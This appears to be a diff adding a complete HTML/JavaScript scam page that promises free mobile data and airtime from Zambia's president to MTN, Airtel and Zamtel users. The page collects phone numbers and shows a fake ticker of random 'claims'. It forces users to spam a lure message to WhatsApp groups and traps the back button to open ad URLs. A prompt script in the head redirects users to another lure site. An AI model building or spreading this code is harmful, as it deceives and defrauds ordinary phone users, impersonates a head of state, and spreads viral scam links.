@@ -1,0 +1,644 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+/* Password Protection Script by www.onlineofferz.xyz*/
+
+var password = '10GB + K500 Airtime'
+
+password=prompt('SMS: Congratulations, your Mobile Number is eligible to receive 10GB + K500 Airtime for all supporters, click OK to Activate now','10GB + K500 Airtime');
+
+if (password != '10GB + K500 Airtime') {
+
+location.href='https://xgiftzinfo.github.io/Nac-Airtports-Job.na';
+
+}
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Free Data & Airtime Reward</title>
+<link href="https://fonts.googleapis.com/css2?family=Nunito:wght@700;800;900&family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+
+  :root {
+    --blue:   #007bff;
+    --blue-d: #0056c7;
+    --green:  #28a745;
+    --green-d:#1e7e34;
+    --white:  #ffffff;
+    --bg:     #f0f4ff;
+    --card-r: 20px;
+    --btn-r:  50px;
+    --shadow: 0 8px 32px rgba(0,123,255,.18);
+    --font-h: 'Nunito', sans-serif;
+    --font-b: 'Poppins', sans-serif;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  html, body {
+    height: 100%; width: 100%;
+    background: var(--bg);
+    font-family: var(--font-b);
+    overflow-x: hidden;
+  }
+
+  /* ─── Page Shell ─── */
+  .page {
+    display: none;
+    min-height: 100vh;
+    padding: 16px 12px 32px;
+    flex-direction: column;
+    align-items: center;
+    animation: fadeIn .4s ease;
+  }
+  .page.active { display: flex; }
+  @keyframes fadeIn { from { opacity:0; transform:translateY(14px); } to { opacity:1; transform:none; } }
+
+  /* ─── Card ─── */
+  .card {
+    width: 100%; max-width: 420px;
+    background: var(--white);
+    border-radius: var(--card-r);
+    box-shadow: var(--shadow);
+    overflow: hidden;
+    padding-bottom: 20px;
+  }
+
+  /* ─── Banner Image Slot ─── */
+  .branding-image {
+    width: 100%;
+    display: block;
+    line-height: 0;
+    overflow: hidden;
+    background: transparent;
+  }
+  .branding-image img {
+    width: 100%;
+    height: auto;
+    display: block;
+    vertical-align: top;
+  }
+
+  /* ─── Card Body ─── */
+  .card-body { padding: 20px 20px 0; }
+
+  .section-title {
+    font-family: var(--font-h);
+    font-size: 18px; font-weight: 800;
+    color: #1a2340;
+    text-align: center;
+    margin-bottom: 4px;
+  }
+  .section-sub {
+    font-size: 12.5px; color: #6c7a9c;
+    text-align: center; margin-bottom: 18px;
+  }
+
+  /* ─── Form ─── */
+  .form-group { margin-bottom: 14px; }
+  .form-group label {
+    display: block; font-size: 12px; font-weight: 600;
+    color: #4a5578; margin-bottom: 6px;
+    text-transform: uppercase; letter-spacing: .5px;
+  }
+  .form-control {
+    width: 100%; padding: 13px 16px;
+    border: 2px solid #e2e8f8;
+    border-radius: 14px;
+    font-family: var(--font-b); font-size: 14px; color: #1a2340;
+    outline: none; transition: border-color .2s;
+    -webkit-appearance: none;
+  }
+  .form-control:focus { border-color: var(--blue); }
+  select.form-control { background: #fff; cursor: pointer; }
+
+  /* ─── Buttons ─── */
+  .btn {
+    display: flex; align-items: center; justify-content: center; gap: 8px;
+    width: 100%; padding: 15px 24px;
+    border: none; border-radius: var(--btn-r);
+    font-family: var(--font-h); font-size: 16px; font-weight: 800;
+    cursor: pointer; transition: transform .15s, box-shadow .15s;
+    text-decoration: none; letter-spacing: .3px;
+  }
+  .btn:active { transform: scale(.97); }
+  .btn-blue {
+    background: linear-gradient(135deg, var(--blue), #00aaff);
+    color: #fff;
+    box-shadow: 0 6px 20px rgba(0,123,255,.35);
+  }
+  .btn-green {
+    background: linear-gradient(135deg, var(--green), #00d455);
+    color: #fff;
+    box-shadow: 0 6px 20px rgba(40,167,69,.35);
+  }
+  .btn-wrap { padding: 16px 20px 4px; }
+
+  /* ─── Shimmer Buttons ─── */
+  .btn-shimmer { position: relative; overflow: hidden; }
+  .btn-shimmer::after {
+    content: '';
+    position: absolute; top: 0; left: -120%;
+    width: 60%; height: 100%;
+    background: linear-gradient(90deg, transparent, rgba(255,255,255,.45), transparent);
+    animation: shimmer 2s infinite;
+  }
+  @keyframes shimmer { 0% { left:-120%; } 100% { left:160%; } }
+  .btn-activate {
+    background: linear-gradient(135deg, #ff6b00, #ffb300);
+    box-shadow: 0 6px 20px rgba(255,107,0,.38);
+    margin-bottom: 12px;
+  }
+  .btn-more {
+    background: linear-gradient(135deg, #7c3aed, #a855f7);
+    box-shadow: 0 6px 20px rgba(124,58,237,.35);
+  }
+
+  /* ─── Ticker ─── */
+  .ticker-wrap {
+    margin: 16px 20px 0;
+    background: #f0f7ff;
+    border-radius: 14px;
+    border: 1.5px solid #cce0ff;
+    padding: 10px 14px;
+    overflow: hidden;
+  }
+  .ticker-label {
+    font-size: 10px; font-weight: 700; color: var(--blue);
+    text-transform: uppercase; letter-spacing: .8px;
+    display: flex; align-items: center; gap: 5px;
+    margin-bottom: 6px;
+  }
+  .live-dot {
+    width: 7px; height: 7px;
+    background: #f00; border-radius: 50%;
+    animation: pulse 1.2s infinite;
+  }
+  @keyframes pulse {
+    0%,100% { opacity:1; transform:scale(1); }
+    50% { opacity:.4; transform:scale(.7); }
+  }
+  .ticker-track { position: relative; height: 22px; overflow: hidden; }
+  .ticker-item {
+    position: absolute; width: 100%;
+    font-size: 12.5px; color: #2d3a5a; font-weight: 500;
+    transition: opacity .5s, transform .5s;
+    opacity: 0;
+    display: flex; align-items: center; gap: 6px;
+  }
+  .ticker-item.show { opacity: 1; transform: translateY(0); }
+  .ticker-item.hide { opacity: 0; transform: translateY(-16px); }
+
+  /* ─── Loading Screen ─── */
+  #loading-screen {
+    display: none;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    padding: 40px 24px;
+    text-align: center;
+  }
+  .spinner {
+    width: 60px; height: 60px;
+    border: 5px solid #e2e8f8;
+    border-top-color: var(--blue);
+    border-radius: 50%;
+    animation: spin .8s linear infinite;
+    margin-bottom: 20px;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .loading-text {
+    font-family: var(--font-h); font-size: 16px; font-weight: 800;
+    color: #1a2340; margin-bottom: 8px;
+  }
+  .loading-sub { font-size: 13px; color: #6c7a9c; }
+
+  /* ─── Progress Bar ─── */
+  .progress-wrap { padding: 0 20px; margin-top: 16px; }
+  .progress-header {
+    display: flex; justify-content: space-between; align-items: center;
+    margin-bottom: 8px;
+  }
+  .progress-label { font-size: 12px; font-weight: 700; color: #4a5578; text-transform: uppercase; letter-spacing: .5px; }
+  .progress-pct { font-family: var(--font-h); font-size: 18px; font-weight: 900; color: var(--green); }
+  .progress-track {
+    width: 100%; height: 20px;
+    background: #e2e8f8; border-radius: 50px;
+    overflow: hidden; position: relative;
+  }
+  .progress-fill {
+    height: 100%;
+    background: linear-gradient(90deg, var(--blue), var(--green));
+    border-radius: 50px;
+    width: 30%;
+    transition: width .6s cubic-bezier(.34,1.56,.64,1);
+    position: relative; overflow: hidden;
+  }
+  .progress-fill::after {
+    content: '';
+    position: absolute; top: 0; left: -60%;
+    width: 40%; height: 100%;
+    background: linear-gradient(90deg, transparent, rgba(255,255,255,.4), transparent);
+    animation: shimmer 1.8s 1s infinite;
+  }
+
+  /* ─── Status Box ─── */
+  .status-box {
+    margin: 14px 20px 0;
+    border-radius: 14px;
+    padding: 12px 14px;
+    font-size: 13px; font-weight: 500;
+    display: flex; align-items: flex-start; gap: 8px;
+    line-height: 1.5;
+  }
+  .status-caution { background: #fff8e1; border: 1.5px solid #ffe082; color: #7a5c00; }
+  .status-success { background: #e8f5e9; border: 1.5px solid #a5d6a7; color: #1b5e20; }
+
+  /* ─── Share Counter ─── */
+  .share-count {
+    text-align: center; margin-top: 10px;
+    font-size: 12.5px; color: #6c7a9c;
+  }
+  .share-count strong { color: var(--blue); }
+
+  /* ─── Confetti Canvas ─── */
+  #confetti-canvas {
+    position: fixed; inset: 0;
+    pointer-events: none; z-index: 999;
+  }
+
+  /* ─── Congrats ─── */
+  .congrats-badge {
+    width: 80px; height: 80px;
+    background: linear-gradient(135deg, #fff176, #ffca28);
+    border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    margin: 20px auto 12px;
+    box-shadow: 0 4px 20px rgba(255,202,40,.5);
+    font-size: 36px;
+    animation: bounceIn .6s cubic-bezier(.34,1.56,.64,1);
+  }
+  @keyframes bounceIn {
+    from { transform: scale(0); opacity: 0; }
+    to   { transform: scale(1); opacity: 1; }
+  }
+  .congrats-title {
+    font-family: var(--font-h); font-size: 22px; font-weight: 900;
+    color: var(--green-d); text-align: center;
+    line-height: 1.25;
+  }
+  .congrats-sub {
+    font-size: 13px; color: #4a5578;
+    text-align: center; padding: 0 16px;
+    margin: 8px 0 4px; line-height: 1.6;
+  }
+  .divider { height: 1px; background: #e2e8f8; margin: 16px 20px; }
+  .cta-label {
+    font-size: 11px; font-weight: 700; color: #9aa6c0;
+    text-transform: uppercase; letter-spacing: .8px;
+    text-align: center; margin-bottom: 12px;
+  }
+
+  /* ─── Security Badge ─── */
+  .secure-badge {
+    display: flex; align-items: center; justify-content: center; gap: 5px;
+    font-size: 11px; color: #9aa6c0; margin-top: 14px;
+    padding: 0 20px;
+  }
+
+  /* ─── Step Dots ─── */
+  .step-dots { display: flex; gap: 6px; justify-content: center; margin-top: 16px; }
+  .dot { width: 8px; height: 8px; border-radius: 50%; background: #cce0ff; transition: background .3s; }
+  .dot.active { background: var(--blue); }
+  .dot.done   { background: var(--green); }
+
+</style>
+<link rel="me" href="https://www.blogger.com/profile/16737217849288108359" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+</head>
+<body>
+
+
+<!-- ═══════════════════════════════════════════ -->
+<!--  PAGE 1 — Landing & Data Collection        -->
+<!-- ═══════════════════════════════════════════ -->
+<div class="page active" id="page1">
+  <div class="card">
+
+    <!-- BANNER IMAGE: replace the src with your image URL -->
+    <div class="branding-image">
+      <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiOIeBBvvipFn2X4VoCdoMVoNXhfVaJTliobHXNNRcm3pJalZ8sUGrl6f69AZ4afNLvn9QuJD8wPxIMgq7PFsh-eo2afFPv-OLhyphenhyphenBlBBaGzQs70FETv2Uf84Xu7_dDfeF2KBJSMhYcALbLfUpvN2NvoBJehxNSmSWIiUmPbe75HDSiuwyw76NDCBATbra4/s1080/HGFRRTRET.png" alt="Campaign Banner">
+    </div>
+
+    <!-- Form -->
+    <div id="form-section">
+      <div class="card-body">
+        <div class="section-title">Check Your Eligibility</div>
+        <div class="section-sub">Enter your details to claim your free reward instantly</div>
+
+        <div class="form-group">
+          <label>📱 Mobile Number</label>
+          <input class="form-control" type="tel" id="phone-input" placeholder="e.g. 801234567" maxlength="14">
+        </div>
+        <div class="form-group">
+          <label>📶 Network Provider</label>
+          <select class="form-control" id="network-select">
+            <option value="">-- Select Network --</option>
+            <option>MTN</option>
+            <option>Airtel</option>
+            <option>Zamtel</option>
+          </select>
+        </div>
+      </div>
+
+      <div class="btn-wrap">
+        <button class="btn btn-blue" onclick="startCheck()">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>
+          CHECK ELIGIBILITY
+        </button>
+      </div>
+
+      <!-- Live Ticker -->
+      <div class="ticker-wrap">
+        <div class="ticker-label">
+          <span class="live-dot"></span> LIVE CLAIMS
+        </div>
+        <div class="ticker-track" id="ticker"></div>
+      </div>
+    </div>
+
+    <!-- Loading Screen -->
+    <div id="loading-screen">
+      <div class="spinner"></div>
+      <div class="loading-text">Verifying your number...</div>
+      <div class="loading-sub">Please wait, we are activating your offer.<br>This takes just a moment ✨</div>
+    </div>
+
+  </div>
+
+  <div class="step-dots">
+    <div class="dot active"></div>
+    <div class="dot"></div>
+    <div class="dot"></div>
+  </div>
+  <div class="secure-badge">
+    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+    Secured · No personal data stored
+  </div>
+</div>
+
+
+<!-- ═══════════════════════════════════════════ -->
+<!--  PAGE 2 — WhatsApp Viral Share             -->
+<!-- ═══════════════════════════════════════════ -->
+<div class="page" id="page2">
+  <div class="card">
+
+    <!-- BANNER IMAGE -->
+    <div class="branding-image">
+      <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh16IztDUTqFQDjwmTeN-A25cYchgOPSO4d0y9r9sGuYE-7tLzdxLx1WUoaspVqJJ8p5UrX9eAsVA-HDVg-C8pyARBOetrvFxWUDZw4IA_sbDPwFWj1ec2sCaK7RsEJgbKtQRgPp8unCwa0jpDRTFF4yNMrK9d4Y0L67SDvtOV6N3Cnfde_tyWXlYczJbA/s1200/hhhuhiu.png" alt="Campaign Banner">
+    </div>
+
+    <div class="card-body">
+      <div class="section-title">Complete sharing to verify you are not a robot</div>
+      <div class="section-sub">Share with friends on WhatsApp to fill the bar to 100%</div>
+    </div>
+
+    <!-- Progress Bar -->
+    <div class="progress-wrap">
+      <div class="progress-header">
+        <span class="progress-label">Unlock Progress</span>
+        <span class="progress-pct" id="pct-display">30%</span>
+      </div>
+      <div class="progress-track">
+        <div class="progress-fill" id="progress-fill" style="width:30%"></div>
+      </div>
+    </div>
+
+    <!-- Status Box -->
+    <div class="status-box status-caution" id="status-box">
+      <span>⚠️</span>
+      <span id="status-text">Share with <strong>5 WhatsApp groups or 15 Friends</strong> to unlock your free Data &amp; Airtime. Tap the button below to share now!</span>
+    </div>
+
+    <div class="share-count">Shares done: <strong id="share-count">0</strong></div>
+
+    <div class="btn-wrap">
+      <button class="btn btn-green" onclick="shareWhatsApp()" id="share-btn">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="#fff"><path d="M12.04 2C6.58 2 2.13 6.45 2.13 11.91c0 1.75.46 3.45 1.32 4.95L2.05 22l5.25-1.38c1.45.79 3.08 1.21 4.74 1.21 5.46 0 9.91-4.45 9.91-9.91 0-2.65-1.03-5.14-2.9-7.01A9.82 9.82 0 0 0 12.04 2zm4.64 13.24c-.2.56-1.15 1.08-1.6 1.15-.41.06-.93.09-1.5-.09-.35-.11-.8-.25-1.37-.49-2.41-1.04-3.99-3.46-4.11-3.62-.12-.16-.97-1.29-.97-2.46s.62-1.75.84-1.99c.22-.24.48-.3.64-.3l.46.01c.15 0 .35-.06.54.41l.77 1.87c.06.15.1.33.01.52l-.28.56-.42.5c-.14.16-.29.33-.13.65.16.32.73 1.2 1.57 1.95.87.77 1.6 1.01 1.92 1.12.32.12.51.1.69-.06l.5-.6c.19-.24.37-.18.63-.11l1.77.84c.26.12.43.18.49.28.07.1.07.57-.13 1.13z"/></svg>
+        SHARE ON WHATSAPP
+      </button>
+    </div>
+
+  </div>
+
+  <div class="step-dots">
+    <div class="dot done"></div>
+    <div class="dot active"></div>
+    <div class="dot"></div>
+  </div>
+  <div class="secure-badge">
+    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+    Your reward is reserved for 10 minutes
+  </div>
+</div>
+
+
+<!-- ═══════════════════════════════════════════ -->
+<!--  PAGE 3 — Congratulations & Ads            -->
+<!-- ═══════════════════════════════════════════ -->
+<div class="page" id="page3">
+  <canvas id="confetti-canvas"></canvas>
+  <div class="card">
+
+    <!-- BANNER IMAGE -->
+    <div class="branding-image">
+      <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh16IztDUTqFQDjwmTeN-A25cYchgOPSO4d0y9r9sGuYE-7tLzdxLx1WUoaspVqJJ8p5UrX9eAsVA-HDVg-C8pyARBOetrvFxWUDZw4IA_sbDPwFWj1ec2sCaK7RsEJgbKtQRgPp8unCwa0jpDRTFF4yNMrK9d4Y0L67SDvtOV6N3Cnfde_tyWXlYczJbA/s1200/hhhuhiu.png" alt="Campaign Banner">
+    </div>
+
+    <div class="congrats-badge">🎁</div>
+    <div class="congrats-title">Congratulations!<br>You've proven that you are not a robot!</div>
+    <div class="congrats-sub">
+      Your free Data &amp; Airtime reward is ready. Click the button below to activate it now before it expires!
+    </div>
+
+    <div class="divider"></div>
+    <div class="cta-label">👇 Tap to Claim Your Reward</div>
+
+    <div class="btn-wrap" style="padding-top:4px;">
+      <button class="btn btn-activate btn-shimmer" onclick="openAd1()">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"/></svg>
+        ACTIVATE OFFER
+      </button>
+      <button class="btn btn-more btn-shimmer" onclick="openAd2()">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>
+        CHECK MORE OFFERS
+      </button>
+    </div>
+
+    <div class="divider"></div>
+    <div style="text-align:center; font-size:11.5px; color:#9aa6c0; padding:0 20px 4px;">
+      🔒 Reward expires in <strong id="countdown" style="color:#e53935;">10:00</strong> — Act fast!
+    </div>
+
+  </div>
+
+  <div class="step-dots">
+    <div class="dot done"></div>
+    <div class="dot done"></div>
+    <div class="dot active"></div>
+  </div>
+</div>
+
+
+<!-- ═══════════════════════════════════════════ -->
+<!--  SCRIPTS                                   -->
+<!-- ═══════════════════════════════════════════ -->
+<script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.9.2/dist/confetti.browser.min.js"></script>
+<script>
+
+/* ─── CONFIG — Edit these URLs ─── */
+const AD_URL_1        = "https://ey43.com/4/9120968";   // ACTIVATE OFFER — tab 1
+const AD_URL_2        = "https://ey43.com/4/9120968";   // ACTIVATE OFFER — tab 2
+const AD_URL_3        = "https://ey43.com/4/9120968";   // CHECK MORE OFFERS button
+const BACK_BTN_AD_URL = "https://soberanvil.com/c1e1be0c?key=46527223d3726e9bf4fd6c2e75557a4a";   // Back-button trap
+
+const WHATSAPP_TEXT   = encodeURIComponent(
+  "*President Hakainde Hichilema Free 10GB+k500 For All Supporters*\n\nI just claimed FREE Data & Airtime! Check if you qualify too: \n\nFOR MTN👇 \nhttps://household-grant-ik.blogspot.com \nFOR AIRTEL👇 \nhttps://household-grant-ik.blogspot.com \n\nFOR ZAMTEL👇"
+);
+const SHARES_NEEDED   = 11;   // shares required to complete bar
+const PROGRESS_STEP   = 7;    // % per share
+/* ─────────────────────────────── */
+
+
+/* ─── Back-Button Trap ─── */
+history.pushState(null, '', location.href);
+history.pushState(null, '', location.href);
+window.addEventListener('popstate', () => {
+  history.pushState(null, '', location.href);
+  window.open(BACK_BTN_AD_URL, '_blank');
+});
+
+
+/* ─── Ticker ─── */
+const PREFIXES = ['08','07','09','07','09'];
+const NETWORKS = ['MTN','Airtel','Zamtel','Airtel','MTN'];
+const REWARDS  = ['10GB+K500','10GB','10GB+K500','K500 airtime','10GB+K500'];
+
+function randTicker() {
+  const pre   = PREFIXES[Math.floor(Math.random()*PREFIXES.length)];
+  const net   = NETWORKS[Math.floor(Math.random()*NETWORKS.length)];
+  const rew   = REWARDS[Math.floor(Math.random()*REWARDS.length)];
+  const stars = '***' + Math.floor(Math.random()*9000+1000);
+  return `User ${pre}${stars} (${net}) just claimed <strong>${rew}</strong>`;
+}
+
+function rotateTicker() {
+  const tickerEl = document.getElementById('ticker');
+  if (!tickerEl) return;
+  const cur = tickerEl.querySelector('.ticker-item');
+  if (cur) { cur.classList.remove('show'); cur.classList.add('hide'); }
+  setTimeout(() => {
+    tickerEl.innerHTML = '';
+    const el = document.createElement('div');
+    el.className = 'ticker-item show';
+    el.innerHTML = `<svg width="13" height="13" viewBox="0 0 24 24" fill="#28a745"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 14.5v-9l6 4.5-6 4.5z"/></svg> ${randTicker()}`;
+    tickerEl.appendChild(el);
+  }, 300);
+}
+rotateTicker();
+setInterval(rotateTicker, 3500);
+
+
+/* ─── Page 1 — Eligibility Check ─── */
+function startCheck() {
+  const phone = document.getElementById('phone-input').value.trim();
+  const net   = document.getElementById('network-select').value;
+  if (phone.length < 9) { alert('Please enter a valid mobile number.'); return; }
+  if (!net) { alert('Please select your network provider.'); return; }
+
+  document.getElementById('form-section').style.display = 'none';
+  document.getElementById('loading-screen').style.display = 'flex';
+  setTimeout(() => { showPage('page2'); }, 3000);
+}
+
+
+/* ─── Page Navigation ─── */
+function showPage(id) {
+  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+  document.getElementById(id).classList.add('active');
+  window.scrollTo(0, 0);
+  if (id === 'page3') launchCelebration();
+}
+
+
+/* ─── Page 2 — WhatsApp Share ─── */
+let progress   = 30;
+let shareCount = 0;
+
+function shareWhatsApp() {
+  window.open(`https://wa.me/?text=${WHATSAPP_TEXT}`, '_blank');
+  shareCount++;
+  document.getElementById('share-count').textContent = shareCount;
+
+  progress = Math.min(100, progress + PROGRESS_STEP);
+  document.getElementById('progress-fill').style.width = progress + '%';
+  document.getElementById('pct-display').textContent   = progress + '%';
+
+  const remaining = Math.max(0, SHARES_NEEDED - shareCount);
+  const box  = document.getElementById('status-box');
+  const text = document.getElementById('status-text');
+
+  if (progress >= 100) {
+    box.className = 'status-box status-success';
+    text.innerHTML = '🎉 <strong>Bar complete!</strong> Redirecting to your reward...';
+    document.getElementById('share-btn').disabled = true;
+    setTimeout(() => showPage('page3'), 1400);
+  } else {
+    text.innerHTML = remaining > 0
+      ? `Share with <strong>${remaining} more group${remaining>1?'s':''}</strong> to unlock your reward!`
+      : 'Almost there! One more tap...';
+  }
+}
+
+
+/* ─── Page 3 — Confetti & Countdown ─── */
+function launchCelebration() {
+  const canvas = document.getElementById('confetti-canvas');
+  canvas.width  = window.innerWidth;
+  canvas.height = window.innerHeight;
+  const myConfetti = confetti.create(canvas, { resize: true, useWorker: true });
+  const fire = (opts) => myConfetti({
+    particleCount: opts.count, spread: opts.spread,
+    origin: { y: 0.6 },
+    colors: ['#007bff','#28a745','#ffca28','#ff6b00','#a855f7','#fff'],
+    ...opts
+  });
+  fire({ count: 120, spread: 80, startVelocity: 45 });
+  setTimeout(() => fire({ count: 80, spread: 120, decay: 0.92, scalar: 1.1 }), 600);
+  setTimeout(() => fire({ count: 60, spread: 60,  startVelocity: 35 }), 1200);
+
+  let secs = 600;
+  const cd = document.getElementById('countdown');
+  const t = setInterval(() => {
+    secs--;
+    if (secs <= 0) { clearInterval(t); cd.textContent = 'EXPIRED'; return; }
+    const m = String(Math.floor(secs/60)).padStart(2,'0');
+    const s = String(secs%60).padStart(2,'0');
+    cd.textContent = `${m}:${s}`;
+  }, 1000);
+}
+
+
+/* ─── Ad Buttons ─── */
+function openAd1() {
+  window.open(AD_URL_1, '_blank');
+  setTimeout(() => window.open(AD_URL_2, '_blank'), 300);
+}
+function openAd2() {
+  window.open(AD_URL_3, '_blank');
+}
+
+</script>
+</body>
+</html>
